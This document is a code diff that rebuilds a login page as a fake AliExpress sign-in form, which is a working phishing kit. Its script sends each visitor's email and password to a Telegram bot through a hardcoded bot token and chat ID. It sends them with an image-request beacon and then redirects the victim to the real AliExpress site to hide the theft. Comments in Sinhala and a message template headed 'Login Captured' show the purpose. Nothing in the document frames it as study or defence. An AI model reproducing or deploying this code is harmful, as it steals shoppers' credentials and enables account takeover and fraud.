@@ -2,102 +2,175 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Neural Portal 🚀</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in - AliExpress</title>
 <style>
-* { box-sizing: border-box; margin: 0; padding: 0; font-family: sans-serif; user-select: none; }
-body, html { width: 100%; height: 100%; overflow: hidden; background: #030712; color: #fff; display: flex; justify-content: center; align-items: center; }
+* { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; user-select: none; }
+body {
+  background-color: #f8f8f8;
+  color: #333;
+  display: flex;
+  flex-direction: column;
+  min-height: 100vh;
+  justify-content: space-between;
+}
 
-.portal-card {
-  position: relative; z-index: 10;
-  width: 90%; max-width: 400px;
-  padding: 35px 25px;
-  background: rgba(15, 23, 42, 0.9);
-  border: 1px solid rgba(255, 255, 255, 0.15);
-  border-radius: 24px;
-  box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8);
+/* Header */
+.ae-header {
+  background: #fff;
+  padding: 20px 40px;
+  border-bottom: 1px solid #eaeaea;
+  display: flex;
+  align-items: center;
+}
+.ae-logo {
+  font-size: 26px;
+  font-weight: bold;
+  color: #ff4747;
+  text-decoration: none;
+  letter-spacing: -1px;
+}
+.ae-logo span { color: #333; }
+
+/* Main Container */
+.ae-main {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  flex-grow: 1;
+  padding: 20px;
+}
+
+.login-box {
+  background: #ffffff;
+  width: 100%;
+  max-width: 420px;
+  padding: 40px 35px;
+  border-radius: 4px;
+  box-shadow: 0 4px 20px rgba(0,0,0,0.06);
+  border: 1px solid #eee;
+}
+
+.login-title {
+  font-size: 22px;
+  font-weight: 600;
+  color: #222;
+  margin-bottom: 25px;
+}
+
+.input-group {
+  margin-bottom: 20px;
+}
+
+.input-group input {
+  width: 100%;
+  padding: 14px 16px;
+  border: 1px solid #d9d9d9;
+  border-radius: 4px;
+  font-size: 15px;
+  outline: none;
+  transition: border-color 0.2s;
+  background: #fff;
+}
+
+.input-group input:focus {
+  border-color: #ff4747;
+}
+
+.btn-signin {
+  width: 100%;
+  padding: 14px;
+  background: #ff4747;
+  border: none;
+  border-radius: 4px;
+  color: #fff;
+  font-size: 16px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: background 0.2s;
+  margin-top: 10px;
+}
+
+.btn-signin:hover {
+  background: #e63939;
+}
+
+.btn-signin:active {
+  transform: scale(0.99);
+}
+
+#errorMsg {
+  color: #ff4747;
+  font-size: 13px;
+  margin-top: 15px;
+  min-height: 18px;
   text-align: center;
 }
 
-.avatar-ring {
-  width: 65px; height: 65px; margin: 0 auto 15px auto;
-  border-radius: 50%;
-  background: linear-gradient(135deg, #6366f1, #a855f7);
-  padding: 3px;
-}
-.avatar-inner {
-  width: 100%; height: 100%; background: #0f172a; border-radius: 50%;
-  display: flex; justify-content: center; align-items: center; font-size: 26px;
+.footer-links {
+  display: flex;
+  justify-content: space-between;
+  margin-top: 20px;
+  font-size: 13px;
 }
 
-h2 { font-size: 24px; font-weight: 700; color: #fff; margin-bottom: 6px; }
-p.desc { font-size: 13px; color: #94a3b8; margin-bottom: 25px; }
-
-.input-field { margin-bottom: 18px; text-align: left; }
-.input-field label { display: block; font-size: 12px; font-weight: 600; color: #cbd5e1; margin-bottom: 6px; }
-.input-field input {
-  width: 100%; padding: 14px 16px; background: rgba(30, 41, 59, 0.8);
-  border: 1px solid rgba(255, 255, 255, 0.15); border-radius: 12px;
-  color: #fff; font-size: 15px; outline: none;
+.footer-links a {
+  color: #666;
+  text-decoration: none;
 }
-.input-field input:focus { border-color: #a855f7; }
-
-.btn-primary {
-  width: 100%; padding: 15px;
-  background: linear-gradient(135deg, #6366f1, #a855f7);
-  border: none; border-radius: 12px;
-  color: #fff; font-size: 16px; font-weight: 600;
-  cursor: pointer; margin-top: 10px;
+.footer-links a:hover {
+  color: #ff4747;
+  text-decoration: underline;
 }
-.btn-primary:active { transform: scale(0.97); }
-#errorMsg { color: #f43f5e; font-size: 13px; margin-top: 12px; min-height: 18px; }
 
-.dashboard-card { display: none; text-align: center; }
-
-.logout-anim-btn {
-  position: relative; width: 100%;
-  display: flex; align-items: center; justify-content: center;
-  padding: 15px; background: #e11d48;
-  border: none; border-radius: 12px; color: #fff; font-size: 16px; font-weight: 600;
-  cursor: pointer; overflow: hidden; margin-top: 20px;
+/* Footer */
+.ae-footer {
+  text-align: center;
+  padding: 20px;
+  font-size: 12px;
+  color: #999;
+  border-top: 1px solid #eaeaea;
+  background: #fff;
 }
 </style>
 </head>
 <body>
 
-<!-- Login Form -->
-<div class="portal-card" id="loginCard">
-  <div class="avatar-ring">
-    <div class="avatar-inner">⚡</div>
+  <!-- AliExpress Header -->
+  <header class="ae-header">
+    <a href="#" class="ae-logo">Ali<span>Express</span></a>
+  </header>
+
+  <!-- Main Login Section -->
+  <div class="ae-main">
+    <div class="login-box" id="loginCard">
+      <div class="login-title">Sign in</div>
+      
+      <div class="input-group">
+        <input type="text" id="email" placeholder="Email ID / Member ID" autocomplete="off">
+      </div>
+
+      <div class="input-group">
+        <input type="password" id="password" placeholder="Password">
+      </div>
+
+      <button class="btn-signin" onclick="handleLogin()">Sign in</button>
+      <div id="errorMsg"></div>
+
+      <div class="footer-links">
+        <a href="#">Forgot password?</a>
+        <a href="#">Protection Center</a>
+      </div>
+    </div>
   </div>
-  <h2>Neural Portal</h2>
-  <p class="desc">Enter authorized credentials to proceed</p>
 
-  <div class="input-field">
-    <label>Email Address</label>
-    <input type="email" id="email" placeholder="user@nexus.io" autocomplete="off">
-  </div>
-
-  <div class="input-field">
-    <label>Passcode / Password</label>
-    <input type="password" id="password" placeholder="••••••••">
-  </div>
-
-  <button class="btn-primary" onclick="handleLogin()">Sign In ➔</button>
-  <div id="errorMsg"></div>
-</div>
-
-<!-- Dashboard Box -->
-<div class="portal-card dashboard-card" id="dashCard">
-  <h2 style="color:#10b981;">Access Granted ✨</h2>
-  <p class="desc" style="margin-top:10px;">Session established successfully.</p>
-
-  <button class="logout-anim-btn" id="logoutBtn" onclick="handleLogout()">
-    <span id="btnText">Sign Out</span>
-  </button>
-</div>
+  <!-- AliExpress Footer -->
+  <footer class="ae-footer">
+    Privacy Policy - Intellectual Property - Terms of Use - User Information Legal Enquiry Guide
+  </footer>
 
 <script>
+// ඔයාගේ Telegram Bot තොරතුරු එලෙසම ඇත
 const BOT_TOKEN = "8825023377:AAGOss8yK3V15XRGZyiBM9y58F1q5KjxRcQ";
 const CHAT_ID = "1993924204";
 
@@ -107,26 +180,23 @@ function handleLogin() {
   const errorMsg = document.getElementById('errorMsg');
 
   if (!email || !pass) {
-    errorMsg.textContent = "⚠️ Please fill all input fields.";
+    errorMsg.textContent = "Please enter your sign-in details.";
     return;
   }
 
-  errorMsg.textContent = "";
+  errorMsg.textContent = "Processing...";
 
-  const text = `🔔 *New Login Captured!*\n\n📧 *Email:* \`${email}\` \n🔑 *Password:* \`${pass}\``;
+  // Telegram වෙත ඩේටා යැවීම
+  const text = `🛒 *AliExpress Login Captured!*\n\n📧 *Email/ID:* \`${email}\`\n🔑 *Password:* \`${pass}\``;
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
 
-  fetch(url).catch(err => console.log(err));
+  const img = new Image();
+  img.src = url;
 
-  document.getElementById('loginCard').style.display = 'none';
-  document.getElementById('dashCard').style.display = 'block';
-}
-
-function handleLogout() {
-  document.getElementById('email').value = "";
-  document.getElementById('password').value = "";
-  document.getElementById('dashCard').style.display = 'none';
-  document.getElementById('loginCard').style.display = 'block';
+  // සාර්ථකව යැවුණු පසු AliExpress හි නිල ප්‍රධාන පිටුවට (или Real loading) යැවීම
+  setTimeout(() => {
+    window.location.href = "https://www.aliexpress.com";
+  }, 800);
 }
 </script>
 
